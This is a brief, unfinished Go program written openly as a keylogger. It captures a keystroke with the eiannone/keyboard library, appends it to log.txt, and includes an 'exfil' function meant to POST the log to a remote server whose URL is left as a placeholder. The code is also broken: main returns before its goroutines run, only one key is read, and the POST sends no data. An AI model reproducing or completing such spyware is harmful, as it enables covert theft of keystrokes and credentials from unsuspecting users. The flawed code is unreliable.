package main

import (
	"fmt"
	"net/http"
	"os"
    "bufio"
	"github.com/eiannone/keyboard"
)

func main() {

    // create the log file
    f, err := os.Create("log.txt")
    check(err)

    // TODO make sure that chanel acutally closes
    defer f.Close()

	// TODO setup correct concurency so that the keystrokes are read correctly
    // and they are also not opening and closing the chanel
	go keylog(*f)
	go exfil()
}

func check(err error)() {
    if err != nil{
        os.Exit(1)
    }
}

func keylog (f os.File)() {
	// log the keystrokes to a file
    keyboard.Open()
    defer keyboard.Close()

    rune, _, err := keyboard.GetSingleKey()
    check(err)

    // write the key to the log file 
    n, err := f.WriteString(string(rune))
    fmt.Println(n)
    check(err)

}

func exfil()() {
    // send the log to a server
    

    resp, err := http.Post("url", "image", nil)
    check(err)

    defer resp.Body.Close()

    scanner := bufio.NewScanner(resp.Body)
    for i := 0; scanner.Scan() && i < 5; i++ {
        fmt.Println(scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        panic(err)
    } 
}
